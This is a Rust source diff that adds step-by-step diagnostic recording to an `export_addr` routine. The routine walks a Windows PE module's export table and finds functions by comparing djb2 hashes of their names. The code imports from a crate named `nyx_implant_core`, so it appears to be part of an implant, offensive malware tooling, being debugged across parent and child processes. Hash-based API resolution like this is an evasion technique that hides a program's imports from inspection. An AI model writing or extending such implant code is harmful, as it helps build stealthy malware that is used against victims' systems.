@@ -309,6 +309,50 @@ pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
         unsafe { diag_u64(5, magic) };
         unsafe { diag_u64(6, erva) };
         unsafe { diag_u64(7, non) };
+        // Deeper replica of export_addr_by_hash_pub's name walk (same reads,
+        // child-side) with per-step recording: dir_size / num_funcs /
+        // names_rva / ords_rva / target hash / match index+1 / fn_rva /
+        // dir_end. Pinpoints whether the hash, the table reads, or the
+        // forwarder branch diverges from the (working) parent replica.
+        if erva != 0 {
+            let dir = unsafe { b.add(erva as usize) };
+            let dir_size = (unsafe { *(nth.add(24 + dd + 4) as *const u32) }) as u64;
+            let num_funcs = (unsafe { *(dir.add(0x14) as *const u32) }) as u64;
+            let names_rva = (unsafe { *(dir.add(0x20) as *const u32) }) as u64;
+            let ords_rva = (unsafe { *(dir.add(0x24) as *const u32) }) as u64;
+            let target = nyx_implant_core::resolve::djb2(func) as u64;
+            unsafe { diag_u64(8, dir_size) };
+            unsafe { diag_u64(9, num_funcs) };
+            unsafe { diag_u64(10, names_rva) };
+            unsafe { diag_u64(11, ords_rva) };
+            unsafe { diag_u64(12, target) };
+            let names = unsafe { b.add(names_rva as usize) } as *const u32;
+            let mut hit = 0u64;
+            let mut fn_rva = 0u64;
+            for i in 0..(non as usize) {
+                let mut p = unsafe { b.add((unsafe { *names.add(i) }) as usize) };
+                let mut h: u32 = 5381;
+                while unsafe { *p } != 0 {
+                    let c = (unsafe { *p }).to_ascii_lowercase() as u32;
+                    h = h.wrapping_mul(33).wrapping_add(c);
+                    p = unsafe { p.add(1) };
+                }
+                if h as u64 == target {
+                    hit = i as u64 + 1;
+                    let ords = unsafe { b.add(ords_rva as usize) } as *const u16;
+                    let funcs = unsafe { b.add((unsafe { *(dir.add(0x1C) as *const u32) }) as usize) }
+                        as *const u32;
+                    let ord = (unsafe { *ords.add(i) }) as usize;
+                    if ord < num_funcs as usize {
+                        fn_rva = (unsafe { *funcs.add(ord) }) as u64;
+                    }
+                    break;
+                }
+            }
+            unsafe { diag_u64(13, hit) };
+            unsafe { diag_u64(14, fn_rva) };
+            unsafe { diag_u64(15, erva + dir_size) };
+        }
     }
     stamp_diag(0xD1); // parent-base miss (post-mortem milestone)
     // 2) loader-walk by export feature (name fields moved on 24H2)
